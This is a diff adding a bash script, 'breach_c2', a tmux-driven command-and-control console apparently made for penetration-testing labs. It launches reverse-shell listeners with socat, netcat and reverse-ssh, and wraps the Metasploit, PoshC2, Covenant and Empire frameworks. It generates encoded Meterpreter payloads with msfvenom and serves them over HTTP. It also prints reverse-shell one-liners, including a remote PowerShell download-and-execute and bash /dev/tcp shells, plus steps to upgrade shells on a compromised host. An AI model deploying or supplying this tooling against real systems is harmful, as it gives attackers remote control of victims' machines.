@@ -1,0 +1,335 @@
+#!/bin/bash
+
+# breach_c2
+script_path="$(dirname \"$0\")"
+#===================================================================================
+# Configuration
+
+ports=(1100)
+primary_ip=10.10.14.17
+
+uuid_length=3
+bc2_dir=~/Downloads/bc2
+bc2socket=/tmp/bc2socket
+
+#===================================================================================
+
+_show_banner() {
+    printf '\n'
+    echo ' ██████╗ ██████╗ ███████╗ █████╗  ██████╗██╗  ██╗         ██████╗██████╗ '
+    echo ' ██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔════╝██║  ██║        ██╔════╝╚════██╗'
+    echo ' ██████╔╝██████╔╝█████╗  ███████║██║     ███████║        ██║      █████╔╝'
+    echo ' ██╔══██╗██╔══██╗██╔══╝  ██╔══██║██║     ██╔══██║        ██║     ██╔═══╝ '
+    echo ' ██████╔╝██║  ██║███████╗██║  ██║╚██████╗██║  ██║███████╗╚██████╗███████╗'
+    echo ' ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚══════╝'
+}
+
+_launch() {
+    if [[ $(tmux -S $bc2socket ls) != *created* ]]; then
+        echo "starting bc2..."
+        _start_server
+    else
+        echo "bc2 is running, attaching..."
+        sleep 0.5
+        tmux -S $bc2socket a -t bc2_cmd:C2
+    fi
+}
+
+_start_server() {
+    mkdir -p $bc2_dir
+    $0 "show_banner" > $bc2_dir/bc2log
+
+    tmux -S $bc2socket new             -s bc2_cmd -n C2 -d
+    tmux -S $bc2socket split-window    -t bc2_cmd
+    tmux -S $bc2socket split-window -h -t bc2_cmd:C2.1
+
+
+    
+    tmux -S $bc2socket send-keys       -t bc2_cmd:C2.3 "clear;tail -f -n 60 $bc2_dir/bc2log" ENTER
+    sleep 0.5
+    tmux -S $bc2socket clear-history   -t bc2_cmd:C2.3
+
+    tmux -S $bc2socket send-keys       -t bc2_cmd:C2.1 "clear;$0 init_cmd" ENTER
+
+    tmux -S $bc2socket send-keys       -t bc2_cmd:C2.2 "sh" ENTER
+    sleep 0.5
+    tmux -S $bc2socket send-keys       -t bc2_cmd:C2.2 "export PS1=''" ENTER
+    sleep 0.5
+    tmux -S $bc2socket send-keys       -t bc2_cmd:C2.2 "clear;tmux -S /tmp/bc2socket clear-history;$0 show_shells $primary_ip ${ports[0]}" ENTER
+
+    tmux -S $bc2socket new             -s bc2_listener -n Listener: -d
+    for port in "${ports[@]}";do
+        _add_simple_listener $port;done
+
+    tmux -S $bc2socket a -t bc2_cmd:C2.2
+}
+
+_init_cmd() {
+    while true;do
+    _task_menu
+    done
+}
+
+_init_connect() {
+    window_uuid=$(pwgen $uuid_length 1)
+    sockdir=$(mktemp -d)
+    sockfile=${sockdir}/usock
+    GREEN=$(tput setaf 2)
+    RED=$(tput setaf 1)
+    normal=$(tput sgr0)
+    printf "%40s\n" "${GREEN}$(date '+%d/%m/%Y %H:%M:%S') | $window_uuid: New Connection on $SOCAT_SOCKPORT from $SOCAT_PEERADDR:$SOCAT_PEERPORT" >> $bc2_dir/bc2log
+    tmux -S $bc2socket new-window -t bc2_cmd -n $window_uuid
+    tmux -S $bc2socket send-keys  -t bc2_cmd:$window_uuid "clear;socat UNIX-LISTEN:${sockfile},umask=0077 STDIO" ENTER
+    tmux -S $bc2socket select-window -t bc2_cmd:C2
+    while test ! -e ${sockfile} ; do sleep 1 ; done
+    tmux -S $bc2socket clear-history   -t bc2_cmd:$window_uuid
+    exec socat STDIO UNIX-CONNECT:$sockfile
+}
+
+_kill_server() {
+    echo Killing breach_c2 Server
+    posh-stop-server
+    tmux -S $bc2socket kill-server
+}
+
+_create_cert() { # TODO
+    openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 30 -out server.crt \
+    -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com"
+    cat server.key server.crt > server.pem
+}
+
+_task_menu() {
+    clear
+    printf "Select Task:\n\n"
+    iter=0
+    for task in "${tasks[@]}";do
+        echo "$iter: ${task}"
+        iter=$((iter+1));done
+    read -n 1 selTask;clear
+    if (( $selTask == 0 )) ; then # New Simple Listener
+        echo "Port Number (Enter 0 to cancel): "
+        read portNumber;clear
+            if (( $portNumber == 0 )) ; then
+                return
+            fi
+        _add_simple_listener $portNumber
+        return
+    elif (( $selTask >= 1 )) && (( $selTask <= 6 )); then # Create C2 Listeners
+        target_task=${tasks[$selTask]}
+        _$target_task
+        return
+    fi
+    windows="$(tmux -S $bc2socket list-windows -t bc2_cmd \
+        | grep -v C2 | cut -d" " -f2)" # | cut -c1-$uuid_length)"
+    win_array=($windows) # convert to array
+    printf "${tasks[$selTask]} >> Select Target (Enter 0 to cancel):\n\n" || return
+    iter=1
+    for window in "${win_array[@]}"; do
+        echo "$iter: $window"
+        iter=$((iter+1));done
+    read -n 1 selWindow;clear
+    if (( $selWindow == 0 )) ; then
+        return
+    fi
+
+    target_task=${tasks[$selTask]}
+    selWindow=$((selWindow-1))
+    target_win=${win_array[$selWindow]}
+    target_win=$(echo $target_win | tr -dc '[:alnum:]') # remove tmux * and -
+
+    echo "Executing $target_task on $target_win... please wait"
+    _$target_task $target_win
+    echo "Done."
+    Sleep 0.5
+    tmux select-window -t $target_win
+}
+
+bc2_help() {
+    echo "Usage:
+
+    bc2                 Start a reverse shell listener or attach to running instance
+    bc2 k[kill]         Kill bc2
+    bc2 h[elp]          Show this help message
+
+    Configuraration is done inside the file.
+"
+}
+
+trap quit SIGINT
+quit() {
+echo "Do you want to quit and kill all sessions? (y/n)"
+  read ctrlc
+  if [ "$ctrlc" = 'y' ]; then
+    _kill_server
+    exit
+  else
+    _init_cmd
+  fi
+}
+
+#===================================================================================
+
+tasks=(
+    "add_simple_listener"
+    "add_rlwrap_listener"
+    "add_revssh_listener"
+    "add_meterpreter_listener"
+    "add_posh_listener"
+    "add_covenant_listener"
+    "add_empire_listener"
+    "add_ssh_window"
+    "save_file"
+    "shell_cleanup_linux"
+    # "sysinfo_linux"
+    # "sysinfo_windows"
+)
+
+_add_simple_listener() {
+    tmux -S $bc2socket new-window -t bc2_listener -n $1 \
+        "socat -v TCP4-LISTEN:$1,reuseaddr,ip-pktinfo,fork EXEC:\"$0 init_connect\""
+        # ^ add -d -d for troubleshooting
+    echo "Now listening on $1" >> $bc2_dir/bc2log
+    # TODO
+    #socat OPENSSL-LISTEN:8443,reuseaddr,ip-pktinfo,cert=server.pem,verify=0,fork EXEC:"./$0 connect"
+}
+
+_add_rlwrap_listener() {
+    tmux -S $bc2socket new-window -t bc2_cmd -n "RLW"
+    tmux -S $bc2socket send-keys  -t bc2_cmd:RLW 'clear;rlwrap nc -nvlp 1101' ENTER
+}
+
+_add_revssh_listener() {
+    tmux -S $bc2socket new-window -t bc2_cmd -n "RevSSH"
+    tmux -S $bc2socket send-keys  -t bc2_cmd:RevSSH 'clear;reverse-ssh -v -l -p 1102' ENTER
+}
+
+_add_meterpreter_listener() {
+    tmux -S $bc2socket new-window -t bc2_cmd -n "META"
+    tmux -S $bc2socket send-keys  -t bc2_cmd:META 'cd $pl' ENTER
+    tmux -S $bc2socket send-keys  -t bc2_cmd:META 'msfconsole -x "use exploits/multi/handler; set lhost 0.0.0.0;  set lport 1103; set payload windows/meterpreter_reverse_tcp; set ExitOnSession false; exploit -j"; echo "Linux pl: linux/x64/meterpreter_reverse_tcp | Python pl: python/meterpreter_reverse_tcp"'
+
+    tmux -S $bc2socket split-window -t bc2_cmd:META
+    tmux -S $bc2socket send-keys  -t bc2_cmd:META 'msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.14.17 LPORT=1103 -f exe -o $pl/windows/agent/meterp.exe -e x86/shikata_ga_nai; msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.24 LPORT=1103 -f elf -o $pl/linux/agent/meterp.elf; msfvenom -p python/meterpreter_reverse_tcp LHOST=10.10.14.14 LPORT=1103 -o $pl/linux/agent/meterp.py; echo "Invoke-WebRequest -Uri http://10.10.14.5:1111/windows/agent/meterp.exe -OutFile meterp.exe"' 
+}
+
+_add_posh_listener() {
+    tmux -S $bc2socket new-window -t bc2_cmd -n "POSH"
+    tmux -S $bc2socket send-keys  -t bc2_cmd:POSH 'cd ~/Downloads;clear' ENTER
+    tmux -S $bc2socket send-keys  -t bc2_cmd:POSH 'echo Run posh-config if needed!;posh-server'
+
+    tmux -S $bc2socket split-window -h -t bc2_cmd:POSH
+    tmux -S $bc2socket send-keys  -t bc2_cmd:POSH 'posh -u breachr'
+
+    tmux -S $bc2socket split-window -t bc2_cmd:POSH
+    tmux -S $bc2socket send-keys  -t bc2_cmd:POSH 'clear;cd /var/poshc2/breach/payloads/ && python3 -m http.server 1112' ENTER
+}
+
+_add_covenant_listener() {
+    # TODO: https://github.com/cobbr/Covenant-wiki/blob/master/Using-The-API.md
+    tmux -S $bc2socket new-window -t bc2_cmd -n "COV"
+    tmux -S $bc2socket send-keys  -t bc2_cmd:COV 'firefox https://127.0.0.1:7443' ENTER
+    tmux -S $bc2socket send-keys  -t bc2_cmd:COV 'clear;cd ~/Downloads/Covenant/Covenant && dotnet run' ENTER
+}
+
+_add_empire_listener() {
+    tmux -S $bc2socket new-window -t bc2_cmd -n "EMP"
+    tmux -S $bc2socket send-keys  -t bc2_cmd:EMP 'sudo powershell-empire client'
+
+    tmux -S $bc2socket split-window -h -t bc2_cmd:EMP
+    tmux -S $bc2socket send-keys  -t bc2_cmd:EMP 'sudo powershell-empire server' ENTER
+
+    tmux -S $bc2socket split-window -t bc2_cmd:EMP
+    tmux -S $bc2socket send-keys  -t bc2_cmd:EMP 'sleep 10; starkiller' ENTER
+}
+
+_add_ssh_window() {
+    tmux -S $bc2socket new-window -t bc2_cmd -n "SSH"
+}
+
+_save_file() {
+    loca="$bc2_dir/${1}_$(date '+%d-%m-%Y_%H-%M-%S').log"
+    tmux -S $bc2socket capture-pane  -t bc2_cmd:$1 -b temp_capture_buffer -S -40000
+    tmux -S $bc2socket save-buffer   -b temp_capture_buffer $loca
+    tmux -S $bc2socket delete-buffer -b capture-buffer
+
+    echo "Content saved to: $loca"
+    sleep 2
+}
+
+_shell_cleanup_linux() {
+    tmux -S $bc2socket send-keys  -t bc2_cmd:$1 "python -c 'import pty; pty.spawn(\"/bin/bash\")' || python3 -c 'import pty; pty.spawn(\"/bin/bash\")' || echo 'no python on target.. cant clean up'" ENTER
+    sleep 1
+    tmux -S $bc2socket send-keys  -t bc2_cmd:$1 "export SHELL=/bin/bash # script -q /dev/null" ENTER
+    tmux -S $bc2socket send-keys  -t bc2_cmd:$1 "export TERM=xterm-256color" ENTER
+    sleep 1
+    tmux -S $bc2socket send-keys  -t bc2_cmd:$1 c-z
+    sleep 1
+    tmux -S $bc2socket send-keys  -t bc2_cmd:$1 "stty raw -echo;fg" ENTER
+    sleep 1
+    tmux -S $bc2socket send-keys  -t bc2_cmd:$1 "reset" ENTER
+    sleep 1
+    tmux -S $bc2socket send-keys  -t bc2_cmd:$1 "stty rows 60 cols 130" ENTER
+}
+
+_sysinfo_linux() {
+    tmux -S $bc2socket send-keys  -t bc2_cmd:$1 "whoami" ENTER
+    sleep 0.5
+    tmux -S $bc2socket send-keys  -t bc2_cmd:$1 "ls -latr" ENTER
+    sleep 0.5
+    tmux -S $bc2socket send-keys  -t bc2_cmd:$1 "environment" ENTER
+}
+
+_sysinfo_windows() {
+    tmux -S $bc2socket send-keys  -t bc2_cmd:$1 "whoami" ENTER
+    sleep 0.5
+    tmux -S $bc2socket send-keys  -t bc2_cmd:$1 "hostname" ENTER
+    sleep 0.5
+    tmux -S $bc2socket send-keys  -t bc2_cmd:$1 "dir" ENTER
+}
+
+#===================================================================================
+
+_show_shells() {
+    printf "\nShells:\n\n"
+    echo "Windows: ConptyShell"
+    echo "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell $1 $2"
+    echo "-------------"
+    echo "Socat"
+    echo "socat -d -d TCP4:$1:$2 EXEC:/bin/bash"
+    echo "-------------"
+    echo "Linux: Bash"
+    echo "bash -c \"bash -i >/dev/tcp/$1/$2 0>&1\""
+    echo "-------------"
+    printf "\nIP Address: \n"
+    nmcli -p device show | grep -e IP4.ADD -e Device | grep -o '^[^\/]*' | awk 'NF>1{print $NF}' | paste - - | column -t | grep -v "(lo)\|(docker0)"
+}
+
+#===================================================================================
+
+if [ $# -eq 0 ]; then
+    _launch
+else
+    case $1 in
+    kill|k|-k|--kill)
+        _kill_server
+        ;;
+    help|h|-h|--help)
+        bc2_help
+        ;;
+    show_banner)
+        _show_banner
+        ;;
+    show_shells)
+        _show_shells $2 $3
+        ;;
+    init_cmd)
+        _init_cmd
+        ;;
+    init_connect)
+        _init_connect
+        ;;
+    *)
+        echo 'Unknown command.';exit
+        ;;
+    esac
+fi
